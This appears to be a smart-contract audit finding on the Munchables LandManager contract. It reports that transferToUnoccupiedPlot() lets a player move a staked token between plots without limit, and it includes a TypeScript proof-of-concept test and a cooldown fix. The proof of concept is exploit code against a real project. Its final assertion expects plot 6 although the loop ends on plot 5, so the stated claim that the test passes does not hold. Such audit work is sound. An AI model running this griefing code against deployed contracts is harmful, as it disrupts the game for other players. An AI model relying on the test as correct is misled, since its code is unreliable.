# Vulnerability details

## The bug
The bug is in the [transferToUnoccupiedPlot()](https://github.com/code-423n4/2024-07-munchables/blob/main/src/managers/LandManager.sol#L199C5-L226C6) function, which allows unlimited transfers between plots without any cooldown or cost.

```solidity
 function transferToUnoccupiedPlot(
        uint256 tokenId,
        uint256 plotId
    ) external override forceFarmPlots(msg.sender) notPaused {
        (address mainAccount, ) = _getMainAccountRequireRegistered(msg.sender);
        ToilerState memory _toiler = toilerState[tokenId];
        uint256 oldPlotId = _toiler.plotId;
        uint256 totalPlotsAvail = _getNumPlots(_toiler.landlord);
        if (_toiler.landlord == address(0)) revert NotStakedError();
        if (munchableOwner[tokenId] != mainAccount) revert InvalidOwnerError();
        if (plotOccupied[_toiler.landlord][plotId].occupied)
            revert OccupiedPlotError(_toiler.landlord, plotId);
        if (plotId >= totalPlotsAvail) revert PlotTooHighError();

        toilerState[tokenId].latestTaxRate = plotMetadata[_toiler.landlord]
            .currentTaxRate;
        plotOccupied[_toiler.landlord][oldPlotId] = Plot({
            occupied: false,
            tokenId: 0
        });
        plotOccupied[_toiler.landlord][plotId] = Plot({
            occupied: true,
            tokenId: tokenId
        });

        emit FarmPlotLeave(_toiler.landlord, tokenId, oldPlotId);
        emit FarmPlotTaken(toilerState[tokenId], tokenId);
    }
```

### Vulnerability vector
A black hat can repeatedly transfer their munchable between different plots, causing excessive state changes and too many event emissions. This can be done in rapid successions, as there's no limit on how often a user can call this function.

### Impact
- Event spam: The constant emission of `FarmPlotLeave` and `FarmPlotTaken` events could therefore overwhelm event listeners or indexers.
- State bloating: Frequent as aggressive state changes could lead to increased storage costs and potentially slow down state-dependent operations.
- Game economic disruptions: Rapid plot transfers, could be exploited to gain unfair advantages in the games.

## Proof of Concept
Add this named `grief.test.ts` to [here](https://github.com/code-423n4/2024-07-munchables/tree/main/tests/managers/LandManager) and it will pass, showing the bug exists. 

```typescript
import assert from "node:assert";
import { after, afterEach, before, beforeEach, describe, it } from "node:test";
import { parseEther, zeroAddress } from "viem";
import { DeployedContractsType } from "../../../deployments/actions/deploy-contracts";
import { assertTxSuccess } from "../../utils/asserters";
import { testClient } from "../../utils/consts";
import { getTestContracts, getTestRoleAddresses } from "../../utils/contracts";
import { MockNFTOverlordContractType, deployMockNFTOverlord } from "../../utils/mock-contracts";
import { registerPlayer } from "../../utils/players";

describe("LandManager: UnboundedPlotTransfers", () => {
  let alice: `0x${string}`;
  let bob: `0x${string}`;
  let beforeSnapshot: `0x${string}`;
  let beforeEachSnapshot: `0x${string}`;
  let testContracts: DeployedContractsType;
  let mockNFTOverlord: MockNFTOverlordContractType;

  before(async () => {
    testContracts = await getTestContracts();

    beforeSnapshot = await testClient.snapshot();

    const testRoleAddresses = await getTestRoleAddresses();
    mockNFTOverlord = await deployMockNFTOverlord({ testContracts });
    [alice, bob] = testRoleAddresses.users;
    await testClient.setBalance({
      address: alice,
      value: parseEther("10"),
    });
    await testClient.setBalance({
      address: bob,
      value: parseEther("10"),
    });
  });

  beforeEach(async () => {
    beforeEachSnapshot = await testClient.snapshot();
  });

  afterEach(async () => {
    await testClient.revert({ id: beforeEachSnapshot });
  });

  after(async () => {
    await testClient.revert({ id: beforeSnapshot });
  });

  describe("unbounded plot transfers", () => {
    beforeEach(async () => {
      await registerPlayer({
        account: alice,
        testContracts,
      });
      await registerPlayer({
        account: bob,
        testContracts,
      });

      // Lock some value for Alice to create multiple plots
      const { request } = await testContracts.lockManager.contract.simulate.lock(
        [zeroAddress, parseEther("10")],
        { account: alice, value: parseEther("10") }
      );
      const txHash = await testClient.writeContract(request);
      await assertTxSuccess({ txHash: txHash });

      // Mint and approve NFT for Bob
      await mockNFTOverlord.write.addReveal([bob, 100], { account: bob });
      await mockNFTOverlord.write.startReveal([bob], { account: bob });
      await mockNFTOverlord.write.reveal([bob, 0, 1], { account: bob });
      
      const approveTxHash = await testContracts.munchNFT.contract.write.approve(
        [testContracts.landManagerProxy.contract.address, 1n],
        { account: bob }
      );
      await assertTxSuccess({ txHash: approveTxHash });

      // Stake Bob's NFT on Alice's plot
      const stakeTxHash = await testContracts.landManagerProxy.contract.write.stakeMunchable(
        [alice, 1n, 0n],
        { account: bob }
      );
      await assertTxSuccess({ txHash: stakeTxHash });
    });

    it("should allow multiple plot transfers without restrictions", async () => {
      const transferCount = 50; // Number of transfers to attempt
      let successfulTransfers = 0;

      for (let i = 0; i < transferCount; i++) {
        try {
          const { request } = await testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot(
            [1n, BigInt((i % 9) + 1)], // Transfer between plots 1-9
            { account: bob }
          );
          const txHash = await testClient.writeContract(request);
          await assertTxSuccess({ txHash });
          successfulTransfers++;
        } catch (error) {
          console.error(`Transfer ${i + 1} failed:`, error);
          break;
        }
      }

      assert.equal(successfulTransfers, transferCount, `Expected ${transferCount} successful transfers, but got ${successfulTransfers}`);
      
      // Verify the final plot location
      const finalPlotId = await testContracts.landManagerProxy.contract.read.getPlotId([1n]);
      assert.equal(finalPlotId, BigInt((transferCount % 9) + 1), "Unexpected final plot ID");

      console.log(`Successfully performed ${successfulTransfers} plot transfers without any restrictions.`);
    });
  });
});
```

## Recommended Fix
- A cooldown period or a cost associated with plot transfers:

```solidity
mapping(uint256 => uint256) private lastTransferTimestamp;
uint256 constant TRANSFER_COOLDOWN = 1 days;

function transferToUnoccupiedPlot(
    uint256 tokenId,
    uint256 plotId
) external override forceFarmPlots(msg.sender) notPaused {
    require(block.timestamp >= lastTransferTimestamp[tokenId] + TRANSFER_COOLDOWN, "Transfer cooldown not met");
    
    // current code is same

    lastTransferTimestamp[tokenId] = block.timestamp;
}
```

The fix I suggest aims to introduce a cooldown period between transfers, mitigating this potential for griefing, while still allowing the legitimate plot transfers.
